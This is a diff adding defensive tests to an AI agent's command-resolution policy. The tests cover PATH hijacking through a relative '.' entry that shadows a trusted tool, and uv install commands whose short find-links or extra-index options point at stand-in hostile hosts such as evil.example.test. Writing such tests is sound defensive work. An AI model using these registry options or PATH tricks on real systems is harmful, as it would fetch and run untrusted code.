@@ -837,6 +837,48 @@ describe("agent resolution", () => {
     expect(recording.invocations[1]?.executable).toBe(shadow);
   });
 
+  it("ignores proposal-relative PATH entries when resolving bare executable identities", async () => {
+    const trustedRoot = join(directory, "trusted-bin");
+    const attackerRoot = join(directory, "attacker-bin");
+    await Promise.all([mkdir(trustedRoot), mkdir(attackerRoot)]);
+    const trusted = join(trustedRoot, "tool");
+    const attacker = join(attackerRoot, "tool");
+    const verify = join(trustedRoot, "verify");
+    await Promise.all([
+      writeFile(trusted, "#!/bin/sh\nexit 0\n"),
+      writeFile(attacker, "#!/bin/sh\nexit 0\n"),
+      writeFile(verify, "#!/bin/sh\nexit 0\n"),
+    ]);
+    await Promise.all([
+      chmod(trusted, 0o755),
+      chmod(attacker, 0o755),
+      chmod(verify, 0o755),
+    ]);
+    const recording = new RecordingExecutor(proposal(action({
+      workingDirectory: attackerRoot,
+    })));
+    const boundedTask = task(directory, {
+      allowedExecutables: ["tool", "verify"],
+    });
+    const result = await Effect.runPromise(Effect.gen(function*() {
+      const service = yield* AgentResolution;
+      return yield* service.resolve({
+        policy: "agent-apply",
+        task: boundedTask,
+        harness: {
+          ...harness(directory, ["tool", "verify"]),
+          environment: [{
+            name: "PATH",
+            value: `.${delimiter}${trustedRoot}`,
+          }],
+        },
+      });
+    }).pipe(Effect.provide(makeAgentResolutionLayer(recording.execute))));
+    expect(result.outcome).toBe("applied");
+    expect(recording.invocations[1]?.executable).toBe(trusted);
+    expect(recording.invocations[1]?.executable).not.toBe(attacker);
+  });
+
   it.each(wrappedPrivilegeCases)("derives wrapped privileged capabilities for %s", async (
     _name,
     executable,
@@ -1241,6 +1283,45 @@ describe("agent resolution", () => {
       expect(recording.invocations[1]?.arguments).toEqual([...arguments_, ...suffix]);
     },
   );
+
+  it.each([
+    ["separate", ["-f", "https://evil.example.test"]],
+    ["attached", ["-f=https://evil.example.test"]],
+  ] as const)("rejects uv short find-links before executing the proposal: %s", async (
+    _name,
+    findLinks,
+  ) => {
+    const manager = join(directory, "uv");
+    const verify = join(directory, "verify");
+    await Promise.all([
+      writeFile(manager, "#!/bin/sh\nexit 0\n"),
+      writeFile(verify, "#!/bin/sh\nprintf verified\n"),
+    ]);
+    await Promise.all([chmod(manager, 0o755), chmod(verify, 0o755)]);
+    const allowedExecutables = [manager, verify];
+    const recording = new RecordingExecutor(proposal(action({
+      executable: manager,
+      arguments: [
+        "tool",
+        "install",
+        "tool==1.2.3",
+        ...findLinks,
+      ],
+    })));
+    const error = await Effect.runPromise(Effect.gen(function*() {
+      const service = yield* AgentResolution;
+      return yield* service.resolve({
+        policy: "agent-apply",
+        task: task(directory, { allowedExecutables }),
+        harness: harness(directory, allowedExecutables),
+      });
+    }).pipe(
+      Effect.provide(makeAgentResolutionLayer(recording.execute)),
+      Effect.flip,
+    ));
+    expect(error).toMatchObject({ capability: "network-origin" });
+    expect(recording.invocations).toHaveLength(1);
+  });
 
   it("rejects conflicting uv index aliases before execution", async () => {
     const manager = join(directory, "uv");
@@ -2558,6 +2639,8 @@ writeFileSync(${JSON.stringify(marker)}, JSON.stringify({
   it.each([
     ["extra index", ["tool", "install", "tool==1.2.3", "--extra-index-url", "https://packages.example.test"]],
     ["find links", ["tool", "install", "tool==1.2.3", "--find-links", "https://packages.example.test"]],
+    ["short find links", ["tool", "install", "tool==1.2.3", "-f", "https://packages.example.test"]],
+    ["attached short find links", ["tool", "install", "tool==1.2.3", "-f=https://packages.example.test"]],
     ["named index", ["tool", "install", "tool==1.2.3", "--index", "evil=https://packages.example.test"]],
   ] as const)("rejects hostile uv registry option before spawning: %s", async (_name, arguments_) => {
     const root = await mkdtemp(join(tmpdir(), "canonfig-uv-option-"));
